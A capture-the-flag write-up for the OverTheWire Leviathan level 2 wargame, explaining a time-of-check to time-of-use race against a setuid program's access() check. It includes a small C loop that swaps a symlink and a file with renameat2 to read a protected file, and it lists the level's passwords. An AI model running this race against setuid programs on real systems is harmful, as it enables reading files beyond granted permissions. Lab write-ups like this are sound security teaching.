# OverTheWire Leviathan Level 2

## Credentials
username: leviathan2
password: mEh5PNl10e

## Writeup
For this challenge, I learned about Time-of-check to Time-of-use (TOCTOU) vulnerabilities and race conditions. This vulnerability occurs when there is a delay between the return of the permission check and when allowing access to a file. In this specific example, we are exploiting a TOCTOU vulnerability in C's `access()` function. What we can do is to create a symbolic link to the file we want to access and then to swap the links with an empty file which we created. If we do this enough times, we will be able to enter a scenario where the `access()` function would be checking an empty file owned by us and in the split second delay between the check permission and grant access to file, the empty file will then become a link which points to the actual file we want to access.

I used the following C script to achieve the race condition file name swapping.

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
	while (1) {
		syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
	}
	return 0;
}
``` 
While running this script in the background, I then used the suid file to check access for level 3's password. After a couple attempts, I managed to obtain the flag. 

## Flag
Level 3 Password: Q0G8j4sakn
